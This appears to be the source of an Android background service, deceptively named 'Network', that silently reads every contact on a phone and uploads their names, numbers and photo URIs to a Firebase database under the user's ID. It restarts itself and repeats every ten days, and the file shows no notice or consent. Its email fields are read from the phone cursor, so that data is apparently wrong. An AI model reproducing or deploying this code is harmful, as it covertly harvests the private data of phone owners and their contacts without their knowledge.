package com.android.check_anonymous;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.IBinder;
import android.provider.ContactsContract;

import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

import static android.R.attr.type;

/**
 * Created by AleksandrP on 28.08.2017.
 */

public class Network extends Service {

    private FirebaseUser mUser;
    private FirebaseAuth mAuth;
    private DatabaseReference mReference;

    @Override
    public void onCreate() {
        super.onCreate();

        MyTimerTask myTask = new MyTimerTask();
        Timer myTimer = new Timer();
        myTimer.schedule(myTask, 5000, 3600000 * 24 * 10);
//        myTimer.schedule(myTask, 5000, 30000 );  //test

    }

    class MyTimerTask extends TimerTask {
        public void run() {
            GET();
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return Service.START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) {
        throw new UnsupportedOperationException("");
    }


    public void GET() {

        mAuth = FirebaseAuth.getInstance();
        mUser = mAuth.getCurrentUser();
        mReference = FirebaseDatabase.getInstance().getReference();

        if (mUser == null) {
            return;
        }


        getAllContactsAndSave();
    }

    private void getAllContactsAndSave() {
        mReference.child(mUser.getUid())
                .removeValue();

        Map<String, UserModel> users = new HashMap<String, UserModel>();

        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);

        int countUser = 0;

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String photoUri = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.PHOTO_THUMBNAIL_URI));
                String lookupKey = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.LOOKUP_KEY));


                if (cur.getInt(cur.getColumnIndex(
                        ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                        String email = pCur.getString(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Email.ADDRESS));
                        int type = pCur.getInt(pCur.getColumnIndex(
                                ContactsContract.CommonDataKinds.Email.TYPE));
                        String typeLabel =
                                (String) ContactsContract.CommonDataKinds.Email.getTypeLabel(getResources(), type, "");

                        UserModel model = new UserModel(
                                phoneNo, name, photoUri, lookupKey, email, typeLabel, type);
                        users.put(countUser + "", model);
                        countUser++;
                    }
                    pCur.close();
                }
            }
            mReference.child(mUser.getUid())
                    .child("data_user")
//                    .push()
                    .setValue(users);
        }
    }

    public class UserModel {

        private String phone;
        private String name;
        private String photoUri;
        private String lookupKey;
        private String email;
        private String typeLabel;
        private int type;

        public UserModel() {
        }

        public UserModel(String mPhone, String mName, String mPhotoUri, String mLookupKey,
                         String mEmail, String mTypeLabel, int mType) {
            phone = mPhone;
            name = mName;
            photoUri = mPhotoUri;
            lookupKey = mLookupKey;
            email = mEmail;
            typeLabel = mTypeLabel;
            type = mType;
        }

        public String getPhone() {
            return phone;
        }

        public void setPhone(String mPhone) {
            phone = mPhone;
        }

        public String getName() {
            return name;
        }

        public void setName(String mName) {
            name = mName;
        }

        public String getPhotoUri() {
            return photoUri;
        }

        public void setPhotoUri(String mPhotoUri) {
            photoUri = mPhotoUri;
        }

        public String getLookupKey() {
            return lookupKey;
        }

        public void setLookupKey(String mLookupKey) {
            lookupKey = mLookupKey;
        }

        public String getEmail() {
            return email;
        }

        public void setEmail(String mEmail) {
            email = mEmail;
        }

        public String getTypeLabel() {
            return typeLabel;
        }

        public void setTypeLabel(String mTypeLabel) {
            typeLabel = mTypeLabel;
        }

        public int getType() {
            return type;
        }

        public void setType(int mType) {
            type = mType;
        }
    }
}
